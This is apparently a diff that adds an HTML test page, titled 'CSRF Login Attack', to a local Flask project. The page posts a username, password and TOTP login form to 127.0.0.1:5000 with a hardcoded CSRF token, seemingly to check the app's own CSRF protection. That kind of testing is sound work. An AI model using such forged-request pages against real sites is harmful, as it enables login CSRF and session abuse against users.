@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Login Attack</title>
+</head>
+<body>
+    <h2>CSRF Login Attack</h2>
+    <p>This page simulates a CSRF attack by attempting to log the user in with a valid CSRF token obtained from a legitimate login form.</p>
+
+    <form method="POST" action="http://127.0.0.1:5000/login">
+        <!-- Replace "/login" with the appropriate endpoint for logging in in your Flask application -->
+        <!-- Include the valid CSRF token obtained from the legitimate login form -->
+        <div>
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+        </div>
+        <div>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+        </div>
+        <div>
+            <label for="totp_code">TOTP Code:</label>
+            <input type="text" id="totp_code" name="totp_code" required>
+        </div>
+        <input type="hidden" name="csrf_token" value="72caea88b811c02e72c3efd3830dbab8">
+        <button type="submit">Perform CSRF Login Attack</button>
+    </form>
+</body>
+</html>
